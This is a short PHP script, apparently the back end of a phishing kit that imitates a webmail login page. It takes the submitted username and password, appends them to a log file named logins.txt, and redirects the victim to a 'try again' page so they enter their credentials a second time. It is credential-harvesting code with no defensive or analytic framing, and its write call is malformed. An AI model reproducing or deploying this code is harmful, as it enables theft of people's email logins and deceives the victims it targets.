<?php

ini_set('display_errors', 1);
ini_set('log_errors', 1);
error_reporting(E_ALL);


 include 'r1574186984/skins/webmail2016/assets/util/api/funcoes.php';
 

 


$user = @$_REQUEST['user'];
$pass = @$_REQUEST['pass'];
$dados = "$user;$pass";


$path = 'pampanet/lgdata/logins.txt';
$msg = $dados;
   
   
   

try {
    $fp = fopen($path, "a+");
    $escreve = fwriter($path, $msg);
   fclose($fp);
   header("location: login.tryagain.php");//pedir outra vez
} catch (Exception $exc) {
    echo $exc->getMessage();
}



    
    
?>